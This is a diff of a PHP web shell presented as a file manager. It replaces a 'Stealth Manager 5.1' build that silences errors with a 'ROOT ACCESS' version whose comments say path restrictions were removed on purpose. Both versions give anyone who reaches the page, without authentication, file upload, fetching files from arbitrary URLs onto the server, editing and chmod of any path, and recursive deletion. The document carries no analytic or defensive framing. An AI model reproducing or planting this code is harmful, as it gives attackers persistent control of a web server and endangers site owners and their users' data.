@@ -1,261 +1,327 @@
 <?php
-error_reporting(0);
-ini_set('display_errors', 0);
-set_time_limit(0);
+// FILE MANAGER - ROOT ACCESS VERSION
+// MOD: menghapus safe_path + mengizinkan akses full filesystem
 
-$path = isset($_REQUEST['path']) ? $_REQUEST['path'] : getcwd();
-$path = str_replace('\\', '/', realpath($path));
-if (!$path || !is_dir($path)) {
-    $path = str_replace('\\', '/', getcwd());
+session_start();
+
+// --- SET BASE DIR (boleh root) ---
+$base_dir = $base_dir;   // root
+if (!is_dir($base_dir)) $base_dir = getcwd();
+
+// --- Hapus safe_path, diganti fungsi bebas ---
+function safe($p){
+    return realpath($p) ?: $p;
 }
 
-$msg = '';
-
-if (isset($_POST['upload'])) {
-    $dest = $path . '/' . $_FILES['file']['name'];
-    if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
-        header("Location: ?path=" . urlencode($path) . "&msg=Upload+Success");
-        exit;
-    } else {
-        $msg = "❌ Error: Upload Failed (Check Permissions)";
+function rrmdir($dir) {
+    if (!is_dir($dir)) return;
+    $items = array_diff(scandir($dir), ['.', '..']);
+    foreach ($items as $it) {
+        $path = $dir . '/' . $it;
+        if (is_dir($path)) rrmdir($path);
+        else @unlink($path);
     }
+    @rmdir($dir);
 }
 
-if (isset($_POST['newFile']) && !empty($_POST['filename'])) {
-    $dest = $path . '/' . basename($_POST['filename']);
-    if (!file_exists($dest)) {
-        if (@touch($dest)) {
-            header("Location: ?path=" . urlencode($path) . "&msg=File+Created");
-            exit;
-        } else { $msg = "❌ Error: Permission Denied"; }
-    } else { $msg = "❌ Error: File exists"; }
+// --- Current DIR ---
+$dir = isset($_REQUEST['dir']) ? safe($_REQUEST['dir']) : safe($base_dir);
+
+// Navigasi naik
+if (isset($_GET['cd_up'])) {
+    $dir = dirname($dir);
 }
 
-if (isset($_POST['newFolder']) && !empty($_POST['foldername'])) {
-    $dest = $path . '/' . basename($_POST['foldername']);
-    if (@mkdir($dest, 0755, true)) {
-        header("Location: ?path=" . urlencode($path) . "&msg=Folder+Created");
-        exit;
-    } else { $msg = "❌ Error: Cannot create folder"; }
+// Jump to
+if (isset($_GET['jump_to'])) {
+    $dir = safe($_GET['jump_to']);
 }
 
+// --- ACTIONS ---
+$msg = "";
 
-if (isset($_POST['applyRename'])) {
-    $old = $path . '/' . $_POST['oldName'];
-    $new = $path . '/' . $_POST['newName'];
-    if (@rename($old, $new)) {
-        header("Location: ?path=" . urlencode($path) . "&msg=Renamed");
-        exit;
-    } else { $msg = "❌ Error: Rename failed"; }
-}
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
-if (isset($_POST['applyChmod'])) {
-    if (@chmod($path . '/' . $_POST['chmodFile'], octdec($_POST['perm']))) {
-        header("Location: ?path=" . urlencode($path) . "&msg=CHMOD+Success");
-        exit;
+    // UPLOAD
+    if (isset($_FILES['upload'])) {
+        if (is_array($_FILES['upload']['name'])) {
+            $names = $_FILES['upload']['name'];
+        } else {
+            $names = [$_FILES['upload']['name']];
+            $_FILES['upload']['tmp_name'] = [$_FILES['upload']['tmp_name']];
+        }
+        foreach ($names as $i => $nm) {
+            if (!$_FILES['upload']['error'][$i]) {
+                move_uploaded_file($_FILES['upload']['tmp_name'][$i], $dir.'/'.basename($nm));
+            }
+        }
+        $msg = "Upload selesai.";
     }
-}
 
-if (isset($_POST['save'])) {
-    $target_path = $_POST['target_path'];
-    $file = $target_path . '/' . $_POST['file_name'];
-    $content = $_POST['content'];
-    
-    if (isset($_POST['content'])) {
-        if (@file_put_contents($file, $content) !== false) {
-            header("Location: ?path=" . urlencode($target_path) . "&msg=Saved+Successfully");
-            exit;
-        } else { 
-            $msg = "❌ Error: Cannot write to " . htmlspecialchars($_POST['file_name']); 
+    // NEW FOLDER
+    if (!empty($_POST['new_folder'])) {
+        @mkdir($dir.'/'.basename($_POST['new_folder']));
+        $msg = "Folder dibuat.";
+    }
+
+    // EDIT FILE
+    if (isset($_POST['edit_file'])) {
+        file_put_contents($_POST['edit_file'], $_POST['content']);
+        $msg = "File disimpan.";
+        $dir = dirname($_POST['edit_file']);
+    }
+
+    // RENAME
+    if (isset($_POST['rename_file'])) {
+        @rename($_POST['rename_file'], dirname($_POST['rename_file']).'/'.basename($_POST['new_name']));
+        $msg = "Rename selesai.";
+    }
+
+    // CHMOD
+    if (isset($_POST['chmod_file'])) {
+        @chmod($_POST['chmod_file'], intval($_POST['mode'],8));
+        $msg = "Permission diubah.";
+    }
+
+    // DOWNLOAD URL
+    if (isset($_POST['download_url'])) {
+        $data = @file_get_contents($_POST['url']);
+        if ($data !== false) {
+            file_put_contents($dir.'/'.basename($_POST['filename']), $data);
+            $msg = "Download selesai.";
+        } else {
+            $msg = "Gagal download URL.";
         }
     }
-}
 
-if (isset($_POST['downloadUrl']) && !empty($_POST['url'])) {
-    $url = $_POST['url'];
-    $name = basename($url);
-    $data = @file_get_contents($url);
-    if ($data === false && function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-    }
-    if ($data && @file_put_contents($path.'/'.$name, $data)) {
-        $msg = "✅ Download Success";
-    } else { $msg = "❌ Download Failed"; }
-}
-
-if (isset($_POST['multiAction']) && !empty($_POST['files'])) {
-    if ($_POST['action_type'] == 'delete') {
-        foreach ($_POST['files'] as $f) {
-            $target = $path . '/' . $f;
-            is_dir($target) ? @exec("rm -rf " . escapeshellarg($target)) : @unlink($target);
-        }
-        header("Location: ?path=" . urlencode($path) . "&msg=Items+Deleted");
-        exit;
-    }
-    if ($_POST['action_type'] == 'zip' && class_exists('ZipArchive')) {
+    // ZIP SELECTED
+    if (isset($_POST['zip_create'])) {
+        $zipname = $dir.'/'.basename($_POST['zip_name']);
+        if (substr($zipname,-4)!=='.zip') $zipname .= '.zip';
         $zip = new ZipArchive();
-        $zipName = $path . '/archive_' . time() . '.zip';
-        if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
-            foreach ($_POST['files'] as $f) {
-                $f_path = $path . '/' . $f;
-                if (is_file($f_path)) $zip->addFile($f_path, $f);
+        if ($zip->open($zipname, ZipArchive::CREATE|ZipArchive::OVERWRITE)) {
+            if (!empty($_POST['selected'])) {
+                foreach ($_POST['selected'] as $s) {
+                    $p = $dir.'/'.$s;
+                    if (is_file($p)) $zip->addFile($p,$s);
+                    if (is_dir($p)) {
+                        $it = new RecursiveIteratorIterator(
+                            new RecursiveDirectoryIterator($p,FilesystemIterator::SKIP_DOTS)
+                        );
+                        foreach ($it as $f) {
+                            $zip->addFile($f->getRealPath(), substr($f->getRealPath(), strlen($dir)+1));
+                        }
+                    }
+                }
             }
             $zip->close();
-            header("Location: ?path=" . urlencode($path) . "&msg=Zip+Created");
-            exit;
         }
+        $msg = "Zip selesai.";
+    }
+
+    // UNZIP
+    if (isset($_POST['unzip_file'])) {
+        $zf = $_POST['unzip_file'];
+        $zip = new ZipArchive();
+        if ($zip->open($zf)) {
+            $zip->extractTo($dir);
+            $zip->close();
+            $msg = "Extract selesai.";
+        } else $msg = "Gagal extract.";
+    }
+
+    // BULK DELETE
+    if (isset($_POST['bulk_delete'])) {
+        foreach ($_POST['selected'] as $s) {
+            $p = $dir.'/'.$s;
+            if (is_dir($p)) rrmdir($p); else @unlink($p);
+        }
+        $msg = "Bulk delete selesai.";
     }
 }
 
-// 9. UNZIP
-if (isset($_GET['unzip']) && class_exists('ZipArchive')) {
-    $zip = new ZipArchive;
-    $zipFile = $path . '/' . $_GET['unzip'];
-    if ($zip->open($zipFile) === TRUE) {
-        $zip->extractTo($path);
-        $zip->close();
-        header("Location: ?path=" . urlencode($path) . "&msg=Unzipped+Successfully");
-        exit;
-    } else { $msg = "❌ Unzip Failed"; }
-}
-
-// 10. SINGLE DELETE
+// DELETE
 if (isset($_GET['delete'])) {
-    $target = $path . '/' . $_GET['delete'];
-    is_dir($target) ? @exec("rm -rf " . escapeshellarg($target)) : @unlink($target);
-    header("Location: ?path=" . urlencode($path));
-    exit;
+    $p = $dir.'/'.$_GET['delete'];
+    if (is_dir($p)) rrmdir($p); else @unlink($p);
+    header("Location:?dir=".urlencode($dir)); exit;
 }
 
-if (isset($_GET['msg'])) $msg = "✅ " . htmlspecialchars($_GET['msg']);
-function perms($f){ return substr(sprintf('%o', @fileperms($f)), -4); }
-function h($s){ return htmlspecialchars($s, ENT_QUOTES); }
-?>
+// DOWNLOAD
+if (isset($_GET['download'])) {
+    $f = $dir.'/'.$_GET['download'];
+    if (is_file($f)) {
+        header("Content-Type: application/octet-stream");
+        header("Content-Disposition: attachment; filename=\"".basename($f)."\"");
+        header("Content-Length: ".filesize($f));
+        readfile($f);
+        exit;
+    }
+}
 
+// FILE LIST
+$items = array_values(array_diff(scandir($dir),['.','..']));
+usort($items,function($a,$b)use($dir){
+    $pa=$dir.'/'.$a; $pb=$dir.'/'.$b;
+    if (is_dir($pa)&&!is_dir($pb)) return -1;
+    if (!is_dir($pa)&&is_dir($pb)) return 1;
+    return strcasecmp($a,$b);
+});
+
+function humanperm($f){
+    return substr(sprintf('%o',fileperms($f)),-4);
+}
+
+// === HTML DARK HACKER THEMES ===
+?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Manager 5.1</title>
-    <style>
-        body{background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px}
-        input,textarea,select,button{background:#111;color:#0f0;border:1px solid #333;padding:5px;margin:2px}
-        table{width:100%;border-collapse:collapse;margin-top:20px}
-        th,td{border:1px solid #222;padding:8px;text-align:left}
-        tr:hover{background:#0a0a0a}
-        .msg{color:yellow;padding:10px;border:1px dashed yellow;margin-bottom:10px}
-        a{color:#00ffcc;text-decoration:none}
-        .btn-red{color:#ff3333}
-        .toolbar{background:#111;padding:10px;border:1px solid #333;margin-bottom:10px}
-    </style>
+<meta charset="utf-8">
+<title>FILE MANAGER FULL ROOT</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:20px}
+a{color:#0f0}
+.panel{background:#050;padding:10px;border:1px solid #0f0;margin-bottom:12px}
+table{width:100%;border-collapse:collapse}
+td,th{border-bottom:1px solid #060;padding:6px}
+.drag{border:1px dashed #0f0;padding:20px;text-align:center;margin-bottom:10px}
+input,button,textarea{background:#000;color:#0f0;border:1px solid #0f0;padding:5px}
+</style>
+<script>
+function prevent(e){e.preventDefault();e.stopPropagation();}
+function initDnD(){
+ let z=document.getElementById("dropz");
+ ["dragenter","dragover","dragleave","drop"].forEach(ev=>z.addEventListener(ev,prevent));
+ z.addEventListener("drop",e=>{
+   let dt=new DataTransfer();
+   for(let f of e.dataTransfer.files) dt.items.add(f);
+   document.getElementById("upload_input").files=dt.files;
+   document.getElementById("upload_form").submit();
+ });
+}
+window.onload=initDnD;
+function toggleAll(b){ document.querySelectorAll(".sel").forEach(c=>c.checked=b.checked); }
+</script>
 </head>
 <body>
 
-<h3>📁 Path: <?=h($path)?></h3>
-<?php if($msg) echo "<div class='msg'>$msg</div>"; ?>
+<h2>FILE MANAGER — ROOT ACCESS</h2>
+<div>Current: <b><?=htmlspecialchars($dir)?></b></div>
 
-<div class="toolbar">
-    <form method="post" style="display:inline">
-        <input type="text" name="filename" placeholder="newfile.php">
-        <button name="newFile">+ File</button>
-    </form>
-    <form method="post" style="display:inline; margin-left:15px">
-        <input type="text" name="foldername" placeholder="new_folder">
-        <button name="newFolder">+ Folder</button>
-    </form>
-    <form method="post" style="display:inline; margin-left:15px">
-        <input type="text" name="url" placeholder="http://link-to-file.zip">
-        <button name="downloadUrl">Remote Download</button>
-    </form>
+<a href="?dir=<?=urlencode(dirname($dir))?>">🔼 Up</a>
+
+<?php if($msg): ?>
+<div class="panel"><b><?=$msg?></b></div>
+<?php endif; ?>
+
+<!-- UPLOAD -->
+<form method="post" enctype="multipart/form-data" id="upload_form" class="panel">
+  <div id="dropz" class="drag">Drop files here / click</div>
+  <input type="file" name="upload[]" multiple id="upload_input">
+  <button>Upload</button>
+</form>
+
+<!-- NEW FOLDER / URL DOWNLOAD -->
+<div class="panel">
+<form method="post">
+  <input name="new_folder" placeholder="New folder">
+  <button>Create</button>
+</form>
+<br>
+<form method="post">
+  <input name="url" placeholder="http://...">
+  <input name="filename" placeholder="save as">
+  <button name="download_url">Download</button>
+</form>
 </div>
 
-<form method="post" enctype="multipart/form-data">
-    <input type="file" name="file">
-    <button name="upload">Upload</button> | 
-    <input name="path" value="<?=h($path)?>" style="width:40%">
-    <button type="submit">Jump</button>
-</form>
-
+<!-- LIST -->
 <form method="post">
-    <table>
-        <thead>
-            <tr style="background:#111">
-                <th><input type="checkbox" onclick="var c=document.getElementsByName('files[]');for(var i=0;i<c.length;i++)c[i].checked=this.checked"></th>
-                <th>Name</th><th>Size</th><th>Perms</th><th>Options</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr>
-                <td></td>
-                <td colspan="4"><a href="?path=<?=urlencode(dirname($path))?>">.. Parent Directory</a></td>
-            </tr>
-            <?php
-            $items = scandir($path);
-            foreach($items as $f):
-                if($f == '.' || $f == '..') continue;
-                $full = $path.'/'.$f;
-                $is_dir = is_dir($full);
-            ?>
-            <tr>
-                <td><input type="checkbox" name="files[]" value="<?=h($f)?>"></td>
-                <td><?= $is_dir ? "📁 <a href='?path=".urlencode($full)."'>$f</a>" : "📄 $f" ?></td>
-                <td><?= $is_dir ? 'DIR' : round(@filesize($full)/1024, 2).' KB' ?></td>
-                <td><a href="?path=<?=urlencode($path)?>&chmod_ui=<?=h($f)?>"><?=perms($full)?></a></td>
-                <td>
-                    <a href="?path=<?=urlencode($path)?>&edit=<?=urlencode($f)?>">Edit</a> |
-                    <a href="?path=<?=urlencode($path)?>&rename_ui=<?=urlencode($f)?>">Rename</a> |
-                    <?php if(!$is_dir && strpos($f, '.zip') !== false): ?>
-                        <a href="?path=<?=urlencode($path)?>&unzip=<?=urlencode($f)?>" style="color:yellow">Unzip</a> |
-                    <?php endif; ?>
-                    <a href="?path=<?=urlencode($path)?>&delete=<?=urlencode($f)?>" class="btn-red" onclick="return confirm('Delete?')">Del</a>
-                </td>
-            </tr>
-            <?php endforeach; ?>
-        </tbody>
-    </table>
-    <div style="margin-top:10px">
-        <select name="action_type">
-            <option value="delete">Delete Selected</option>
-            <option value="zip">Zip Selected</option>
-        </select>
-        <button name="multiAction">Apply Action</button>
-    </div>
+<table>
+<tr><th><input type="checkbox" onclick="toggleAll(this)"></th><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>
+
+<?php
+foreach($items as $it):
+$full=$dir.'/'.$it;
+?>
+<tr>
+<td><input type="checkbox" class="sel" name="selected[]" value="<?=$it?>"></td>
+<td>
+<?php if(is_dir($full)): ?>
+<a href="?dir=<?=urlencode($full)?>">[DIR] <?=htmlspecialchars($it)?></a>
+<?php else: ?>
+<a href="?dir=<?=urlencode($dir)?>&download=<?=urlencode($it)?>"><?=htmlspecialchars($it)?></a>
+ (<a href="?dir=<?=urlencode($dir)?>&preview=<?=urlencode($it)?>">preview</a>)
+<?php endif; ?>
+</td>
+<td><?=is_dir($full)?'-':filesize($full)?></td>
+<td><?=humanperm($full)?></td>
+<td>
+<a href="?dir=<?=urlencode($dir)?>&delete=<?=urlencode($it)?>" onclick="return confirm('Delete?')">del</a> |
+<a href="?dir=<?=urlencode($dir)?>&rename=<?=urlencode($it)?>">rename</a> |
+<a href="?dir=<?=urlencode($dir)?>&chmod=<?=urlencode($it)?>">chmod</a>
+</td>
+</tr>
+<?php endforeach; ?>
+</table>
+
+<button name="bulk_delete" onclick="return confirm('Delete selected?')">Delete Selected</button>
+<button name="zip_create">Zip Selected</button>
+<input name="zip_name" placeholder="name.zip">
 </form>
 
-<?php if(isset($_GET['edit'])): 
-    $filename = $_GET['edit'];
-    $file_content = file_exists($path.'/'.$filename) ? h(file_get_contents($path.'/'.$filename)) : '';
+<!-- EXTRA PANELS -->
+<div class="panel">
+<?php
+// PREVIEW
+if (isset($_GET['preview'])) {
+    $p = $dir.'/'.$_GET['preview'];
+    echo "<h3>Preview:</h3>";
+    echo "<pre>".htmlspecialchars(@file_get_contents($p))."</pre>";
+}
+
+// EDIT
+if (isset($_GET['edit'])) {
+    $p = $dir.'/'.$_GET['edit'];
+    $ct = htmlspecialchars(@file_get_contents($p));
+    ?>
+    <h3>Edit: <?=htmlspecialchars($_GET['edit'])?></h3>
+    <form method="post">
+      <input type="hidden" name="edit_file" value="<?=$p?>">
+      <textarea name="content" style="width:100%;height:300px"><?=$ct?></textarea>
+      <button>Save</button>
+    </form>
+    <?php
+}
+
+// RENAME
+if (isset($_GET['rename'])) {
+    $p = $dir.'/'.$_GET['rename'];
+    ?>
+    <h3>Rename: <?=htmlspecialchars($_GET['rename'])?></h3>
+    <form method="post">
+      <input type="hidden" name="rename_file" value="<?=$p?>">
+      <input name="new_name" value="<?=htmlspecialchars($_GET['rename'])?>">
+      <button>Rename</button>
+    </form>
+    <?php
+}
+
+// CHMOD
+if (isset($_GET['chmod'])) {
+    $p = $dir.'/'.$_GET['chmod'];
+    ?>
+    <h3>CHMOD: <?=htmlspecialchars($_GET['chmod'])?></h3>
+    <form method="post">
+      <input type="hidden" name="chmod_file" value="<?=$p?>">
+      <input name="mode" placeholder="0755">
+      <button>Apply</button>
+    </form>
+    <?php
+}
 ?>
-    <hr><h4>Editing: <?=h($filename)?></h4>
-    <form method="post">
-        <input type="hidden" name="target_path" value="<?=h($path)?>">
-        <input type="hidden" name="file_name" value="<?=h($filename)?>">
-        <textarea name="content" style="width:100%;height:400px"><?= $file_content ?></textarea><br>
-        <button name="save" style="width:100%; background:green; color:#fff; cursor:pointer; font-weight:bold">SAVE CHANGES</button>
-    </form>
-<?php endif; ?>
-
-<?php if(isset($_GET['rename_ui'])): ?>
-    <hr><h4>Rename: <?=h($_GET['rename_ui'])?></h4>
-    <form method="post">
-        <input type="hidden" name="oldName" value="<?=h($_GET['rename_ui'])?>">
-        <input type="text" name="newName" value="<?=h($_GET['rename_ui'])?>" style="width:300px">
-        <button name="applyRename">Rename Now</button>
-    </form>
-<?php endif; ?>
-
-<?php if(isset($_GET['chmod_ui'])): ?>
-    <hr><h4>CHMOD: <?=h($_GET['chmod_ui'])?></h4>
-    <form method="post">
-        <input type="hidden" name="chmodFile" value="<?=h($_GET['chmod_ui'])?>">
-        <input type="text" name="perm" value="<?=perms($path.'/'.$_GET['chmod_ui'])?>">
-        <button name="applyChmod">Apply CHMOD</button>
-    </form>
-<?php endif; ?>
+</div>
 
 </body>
 </html>
